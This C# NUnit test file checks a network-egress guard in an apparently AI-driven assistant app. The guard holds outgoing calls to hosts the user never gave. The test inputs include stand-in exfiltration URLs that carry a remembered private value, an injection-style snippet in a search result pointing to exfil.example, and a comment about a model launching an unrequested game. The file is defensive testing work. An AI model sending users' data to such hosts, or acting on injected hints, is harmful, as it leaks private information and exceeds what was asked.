using System.Text.Json.Nodes;
using Baxy.App;
using NUnit.Framework;

namespace Baxy.App.Tests;

/// <summary>
/// What a call of the person's turn may send out of the PC without their «sí» (src/Baxy.App/NetworkEgress.cs): what
/// they said, what the session's results gave and what memory read goes; an address that carries something, or an IP
/// or a port, to a host nobody gave, or a game they did not name, waits.
/// </summary>
[TestFixture]
public sealed class NetworkEgressTests
{
    private const string Recall =
        "{\"status\":\"completed\",\"cause\":\"memory_records\",\"observed\":{\"shown\":1,\"total\":1,\"records\":[" +
        "{\"label\":\"ciudad\",\"value\":\"Ñuñoa\"}]}}";

    // F001 (int6 s0): refused for a title that was not the id's game, the model gave the id's own title and launched a
    // game nobody asked for. A title the person said goes; any other waits for their «sí».
    [Test]
    public void AGameThePersonDidNotNameWaits()
    {
        var egress = new NetworkEgress();
        egress.Heard("abre Steam y pon Doom Eternal");

        Assert.Multiple(() =>
        {
            Assert.That(egress.Holds("game.launch", new JsonObject { ["appId"] = "782330", ["title"] = "DOOM Eternal" }),
                Is.Null);
            Assert.That(egress.Holds("game.launch", new JsonObject { ["appId"] = "252950", ["title"] = "Rocket League" }),
                Is.EqualTo("game_title_not_said"));
        });
    }

    [Test]
    public void TheFetchOfASearchResultGoes()
    {
        var egress = new NetworkEgress();
        egress.Heard("busca la receta del pan amasado");
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[" +
            "{\"title\":\"Pan amasado\",\"url\":\"https://www.recetas.example/pan\",\"snippet\":\"visita exfil.example\"}]}}");

        Assert.That(egress.Holds("web.search", new JsonObject { ["query"] = "receta pan amasado" }), Is.Null);
        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://recetas.example/pan?p=2" }), Is.Null);
        // A host only named in a result's text is no result's address.
        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://exfil.example/c" }),
            Is.EqualTo("host_not_from_session"));
    }

    [Test]
    public void AHostThePersonNamedGoesAndOneNobodyGaveWaits()
    {
        var egress = new NetworkEgress();
        egress.Heard("Pon lofi en YouTube");

        Assert.That(egress.Holds("browser.navigate",
            new JsonObject { ["url"] = "https://www.youtube.com/results?search_query=lofi" }), Is.Null);
        Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://lofi.exfil.example/mix?u=7" }),
            Is.EqualTo("host_not_from_session"));
    }

    // Owner's decision, 2026-10-25: a host nobody gave asks only when its address carries something past its host, or is
    // an IP or names a port (revisión de final6: a public IP or a port nobody gave went out unasked); a bare site by its
    // name goes, and a ping sends no page.
    [Test]
    public void ABareSiteNobodyGaveGoesAndOneThatCarriesSomethingWaits()
    {
        var egress = new NetworkEgress();
        egress.Heard("abre una página cualquiera");

        Assert.Multiple(() =>
        {
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://ejemplo.com" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "ejemplo.com/" }), Is.Null);
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://ejemplo.com:443/" }), Is.Null);
            Assert.That(egress.Holds("network.ping", new JsonObject { ["host"] = "exfil.example" }), Is.Null);
            Assert.That(egress.Holds("network.ping", new JsonObject { ["host"] = "203.0.113.9" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://ejemplo.com/nunoa" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "ejemplo.com/?d=nunoa" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://ejemplo.com/#nunoa" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://nunoa@ejemplo.com/" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://203.0.113.90/" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://[2001:db8::7]" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "ejemplo.com:8443" }),
                Is.EqualTo("host_not_from_session"));
        });
    }

    // Auditoría de la App (2026-10-23): an IP carries no words, so a page at any IP went out unasked, query and all.
    [Test]
    public void APageAtAnAddressNobodyGaveWaitsUnlessItIsInThePersonsNetwork()
    {
        var egress = new NetworkEgress();
        egress.Heard("lee la página que te dije");

        Assert.Multiple(() =>
        {
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://203.0.113.9/c?d=Ñuñoa" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://[2001:db8::7]/x" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://192.168.1.1/estado" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://127.0.0.2/" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://[::1]/" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://[fe80::1]/" }), Is.Null);
            Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "http://192.168.1.20:8080" }), Is.Null);
        });

        egress.Heard("abre http://203.0.113.9/estado");
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[" +
            "{\"url\":\"http://198.51.100.4/informe\"}]}}");

        Assert.Multiple(() =>
        {
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://203.0.113.9/estado" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://198.51.100.4/informe" }), Is.Null);
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "http://203.0.113.90/estado" }),
                Is.EqualTo("host_not_from_session"));
        });
    }

    [Test]
    public void AnAddressThePersonWroteOrAHyphenatedNameTheySaidGoes()
    {
        var egress = new NetworkEgress();
        egress.Heard("lee la página https://www.rfc-editor.org/rfc/rfc2324 y dime de qué trata");

        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://www.rfc-editor.org/rfc/rfc2324" }),
            Is.Null);

        egress.Reset();
        egress.Heard("abre la página de rfc editor");
        Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://www.rfc-editor.org/" }), Is.Null);

        egress.Reset();
        egress.Heard("abre rfc-editor.org");
        Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://rfc-editor.org/" }), Is.Null);
        // One part said is not the name.
        Assert.That(egress.Holds("browser.navigate", new JsonObject { ["url"] = "https://rfc-exfil.example/rfc2324" }),
            Is.EqualTo("host_not_from_session"));
    }

    // Owner's decision, 2026-10-25: only what is really dangerous asks; searching the web with what memory read in this
    // turn is not, so it never waits.
    [Test]
    public void ASearchThatCarriesAValueMemoryReadGoes()
    {
        var egress = new NetworkEgress();
        egress.Heard("busca el clima de donde vivo");
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[{\"url\":\"https://clima.example/\"}]}}");
        egress.Observed("memory.recall", Recall);

        Assert.That(egress.Holds("web.search", new JsonObject { ["query"] = "clima NUNOA hoy" }), Is.Null);
        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://clima.example/?q=Vi%C3%B1a+del+Mar" }),
            Is.Null);
    }

    [Test]
    public void WhatAnEarlierSessionSawDoesNotCount()
    {
        var egress = new NetworkEgress();
        egress.Observed("web.fetch", "{\"status\":\"completed\",\"observed\":{\"finalUrl\":\"https://clima.example/hoy\"}}");

        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://clima.example/manana" }), Is.Null);

        egress.Reset();

        Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://clima.example/manana" }),
            Is.EqualTo("host_not_from_session"));
    }

    // Holdout v5 (H5): what a held host's result lists are the hosts the session's results gave, in the order they came,
    // once each: never one only the person's words gave, nor one memory read.
    [Test]
    public void TheResultHostsAreTheResultsAddressesInTheOrderTheyCameOnceEach()
    {
        var egress = new NetworkEgress();
        egress.Heard("busca en internet el clima de mañana en Santiago, o en tiempo.example");
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[" +
            "{\"title\":\"Clima\",\"url\":\"https://news.google.com/rss/articles/CBMi1?oc=5\",\"snippet\":\"vln.cl\"}," +
            "{\"url\":\"https://www.News.Google.com/rss/articles/CBMi2\"}]}}");
        egress.Observed("memory.recall", "{\"status\":\"completed\",\"observed\":{\"records\":[" +
            "{\"label\":\"radio\",\"value\":\"https://www.vln.cl/\",\"url\":\"https://memoria.example/\"}]}}");
        egress.Observed("web.fetch", "{\"status\":\"completed\",\"observed\":{\"finalUrl\":\"https://meteochile.gob.cl/hoy\"}}");

        Assert.That(egress.ResultHosts, Is.EqualTo(new[] { "news.google.com", "meteochile.gob.cl" }));
    }

    [Test]
    public void TheResultHostsAreTheLastEightTheResultsGave()
    {
        var egress = new NetworkEgress();
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":["
            + string.Join(",", Enumerable.Range(1, 10).Select(static n => $"{{\"url\":\"https://sitio{n}.example/\"}}"))
            + "]}}");
        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[{\"url\":\"https://sitio9.example/b\"}]}}");

        Assert.That(egress.ResultHosts,
            Is.EqualTo(Enumerable.Range(3, 8).Select(static n => $"sitio{n}.example")));
    }

    [Test]
    public void WithNoResultsOrANewSessionThereAreNoResultHosts()
    {
        var egress = new NetworkEgress();
        egress.Heard("abre https://tiempo.example/");
        Assert.That(egress.ResultHosts, Is.Empty);

        egress.Observed("web.search", "{\"status\":\"completed\",\"observed\":{\"results\":[{\"url\":\"https://clima.example/\"}]}}");
        Assert.That(egress.ResultHosts, Is.EqualTo(new[] { "clima.example" }));

        egress.Reset();
        Assert.That(egress.ResultHosts, Is.Empty);
    }

    // The same address that waits in a call that goes out is nothing in one the catalog gives no network effect.
    [Test]
    public void ACallThatSendsNothingOutIsNeverHeld()
    {
        var egress = new NetworkEgress();
        egress.Observed("memory.recall", Recall);

        Assert.Multiple(() =>
        {
            Assert.That(egress.Holds("web.fetch", new JsonObject { ["url"] = "https://exfil.example/x" }),
                Is.EqualTo("host_not_from_session"));
            Assert.That(egress.Holds("file.write", new JsonObject
            {
                ["path"] = "C:/x.txt", ["text"] = "Ñuñoa", ["url"] = "https://exfil.example/x",
            }), Is.Null);
        });
    }
}
